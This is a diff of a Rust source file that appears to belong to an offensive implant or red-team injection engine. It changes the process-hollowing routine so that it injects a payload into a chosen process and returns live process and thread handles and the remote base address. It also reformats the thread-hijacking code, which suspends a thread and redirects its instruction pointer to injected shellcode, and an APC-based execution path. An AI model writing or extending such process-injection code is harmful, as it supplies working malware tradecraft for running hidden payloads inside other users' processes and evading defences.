@@ -2997,25 +2997,38 @@ fn inject_phantom_dll_hollow_dispatch(
 }
 
 fn inject_process_hollow(pid: u32, payload: &[u8]) -> Result<InjectionHandle, InjectionError> {
-    crate::injection::inject_with_method(
-        crate::injection::InjectionMethod::Hollowing,
-        pid,
-        payload,
-    )
-    .map_err(|e| InjectionError::InjectionFailed {
-        technique: InjectionTechnique::ProcessHollow,
-        reason: e.to_string(),
+    if pid == 0 {
+        hollowing::hollow_and_execute(payload).map_err(|e| InjectionError::InjectionFailed {
+            technique: InjectionTechnique::ProcessHollow,
+            reason: e.to_string(),
+        })?;
+
+        return Ok(InjectionHandle {
+            target_pid: 0,
+            technique_used: InjectionTechnique::ProcessHollow,
+            injected_base_addr: 0,
+            payload_size: payload.len(),
+            thread_handle: None,
+            process_handle: std::ptr::null_mut(),
+            sleep_enrolled: false,
+            sleep_stub_addr: 0,
+        });
+    }
+
+    let injected = hollowing::inject_into_process_with_info(pid, payload).map_err(|e| {
+        InjectionError::InjectionFailed {
+            technique: InjectionTechnique::ProcessHollow,
+            reason: e.to_string(),
+        }
     })?;
 
-    // Process hollowing creates its own sacrificial process; we don't have
-    // the handle. Return a minimal handle.
     Ok(InjectionHandle {
-        target_pid: pid,
+        target_pid: injected.target_pid,
         technique_used: InjectionTechnique::ProcessHollow,
-        injected_base_addr: 0,
-        payload_size: payload.len(),
-        thread_handle: None,
-        process_handle: std::ptr::null_mut(),
+        injected_base_addr: injected.remote_base,
+        payload_size: injected.payload_size,
+        thread_handle: injected.thread_handle,
+        process_handle: injected.process_handle,
         sleep_enrolled: false,
         sleep_stub_addr: 0,
     })
@@ -3109,18 +3122,21 @@ fn inject_thread_hijack(pid: u32, payload: &[u8]) -> Result<InjectionHandle, Inj
         let (h_proc, remote_base) = alloc_write_exec(pid, payload)?;
 
         // ── Step 2: Find a suitable thread to hijack ────────────────────
-        let (h_thread, tid) = find_alertable_thread(h_proc, pid).or_else(|| {
-            // If no alertable thread, try enumerating all threads and pick
-            // the first one we can open with sufficient access.
-            find_any_thread(h_proc, pid)
-        }).ok_or_else(|| InjectionError::InjectionFailed {
-            technique: InjectionTechnique::ThreadHijack,
-            reason: format!("no hijackable thread found in pid {}", pid),
-        })?;
+        let (h_thread, tid) = find_alertable_thread(h_proc, pid)
+            .or_else(|| {
+                // If no alertable thread, try enumerating all threads and pick
+                // the first one we can open with sufficient access.
+                find_any_thread(h_proc, pid)
+            })
+            .ok_or_else(|| InjectionError::InjectionFailed {
+                technique: InjectionTechnique::ThreadHijack,
+                reason: format!("no hijackable thread found in pid {}", pid),
+            })?;
 
         log::info!(
             "injection_engine: ThreadHijack: hijacking thread {} in pid {}",
-            tid, pid,
+            tid,
+            pid,
         );
 
         // ── Step 3: Suspend the thread ──────────────────────────────────
@@ -3161,7 +3177,8 @@ fn inject_thread_hijack(pid: u32, payload: &[u8]) -> Result<InjectionHandle, Inj
         let original_rip = context_ip(&ctx);
         log::debug!(
             "injection_engine: ThreadHijack: thread {} original RIP={:#x}",
-            tid, original_rip,
+            tid,
+            original_rip,
         );
 
         // ── Step 5: Redirect RIP to payload ─────────────────────────────
@@ -3200,7 +3217,9 @@ fn inject_thread_hijack(pid: u32, payload: &[u8]) -> Result<InjectionHandle, Inj
 
         log::info!(
             "injection_engine: ThreadHijack: thread {} RIP redirected {:#x} → {:#x}",
-            tid, original_rip, remote_base,
+            tid,
+            original_rip,
+            remote_base,
         );
 
         // Keep the thread handle open — caller may need it for cleanup.
@@ -8396,10 +8415,7 @@ fn build_restore_trampoline_x86_64(
 /// Used by `inject_thread_hijack` when no alertable thread is available.
 /// Opens the first thread that can be opened with THREAD_GET_CONTEXT |
 /// THREAD_SET_CONTEXT | THREAD_SUSPEND_RESUME access.
-unsafe fn find_any_thread(
-    _h_proc: *mut c_void,
-    pid: u32,
-) -> Option<(*mut c_void, u32)> {
+unsafe fn find_any_thread(_h_proc: *mut c_void, pid: u32) -> Option<(*mut c_void, u32)> {
     let tid = find_best_thread(pid)?;
     let thread_access: u64 = 0x0008 | 0x0010 | 0x0002; // GET_CONTEXT | SET_CONTEXT | SUSPEND_RESUME
     let mut client_id = [0u64; 2];
@@ -10143,8 +10159,7 @@ unsafe fn execute_via_apc(
                 technique: technique.clone(),
                 reason: format!(
                     "NtQueueApcThread to tid {} failed (status={:?})",
-                    tid,
-                    apc_status
+                    tid, apc_status
                 ),
             });
         }
